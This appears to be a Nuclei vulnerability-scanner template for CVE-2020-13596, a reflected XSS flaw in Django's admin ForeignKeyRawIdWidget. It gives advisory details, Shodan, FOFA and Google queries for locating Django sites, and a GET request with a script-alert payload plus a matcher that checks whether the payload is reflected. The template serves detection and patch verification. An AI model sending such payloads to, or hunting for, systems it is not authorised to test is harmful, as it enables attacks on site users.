id: CVE-2020-13596

info:
  name: Django ForeignKeyRawIdWidget XSS
  author: ProjectDiscoveryAI
  severity: medium
  description: An issue was discovered in Django 2.2 before 2.2.13 and 3.0 before 3.0.7. Query parameters generated by the Django admin ForeignKeyRawIdWidget were not properly URL encoded, leading to a possibility of an XSS attack.
  impact: |
    Allows attackers to execute malicious scripts in the context of a user's browser session
  remediation: |
    Upgrade Django to version 2.2.13, 3.0.7, 3.1.1 or higher
  reference:
    - https://groups.google.com/forum/#%21msg/django-announce/pPEmb2ot4Fo/X-SMalYSBAAJ
    - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4A2AP4T7RKPBCLTI2NNQG3T6MINDUUMZ/
    - https://security.netapp.com/advisory/ntap-20200611-0002/
    - https://usn.ubuntu.com/4381-1/
    - https://usn.ubuntu.com/4381-2/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-13596
    cwe-id: CWE-79
    epss-score: 0.01605
    epss-percentile: 0.87939
    cpe: cpe:2.3:a:djangoproject:django:*:*:*:*:*:*:*:*
  metadata:
    vendor: djangoproject
    product: django
    shodan-query:
      - cpe:"cpe:2.3:a:djangoproject:django"
      - cpe:"cpe:2.3:a:djangoproject:django" || http.title:"django administration"
      - http.html:"settings.py"
      - http.title:"the install worked successfully! congratulations!"
    fofa-query:
      - body=settings.py
      - title="the install worked successfully! congratulations!"
    google-query: intitle:"the install worked successfully! congratulations!"

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/yourapp/yourmodel/?t=<script>alert('XSS')</script>"

    matchers:
      - type: word
        words:
          - "<script>alert('XSS')</script>"
        part: body
